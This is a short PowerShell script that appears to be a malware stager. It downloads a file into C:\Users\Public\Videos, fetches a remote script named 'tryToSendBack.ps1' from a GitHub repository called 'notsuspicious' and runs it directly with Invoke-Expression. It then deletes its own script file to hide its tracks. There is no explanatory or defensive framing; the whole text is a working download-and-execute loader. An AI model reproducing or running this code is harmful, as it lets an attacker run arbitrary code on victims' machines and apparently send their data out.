try {
    # Download url.txt
    Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
    
    # Download sendBack.ps1
    Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/tryToSendBack.ps1" -UseBasicParsing).Content
}
catch {
    # Handle exceptions here
    Write-Host "An error occurred: $_"
}
finally {
    # Delete the ps1 file after execution
    Remove-Item -Path $ps1FilePath -Force
}
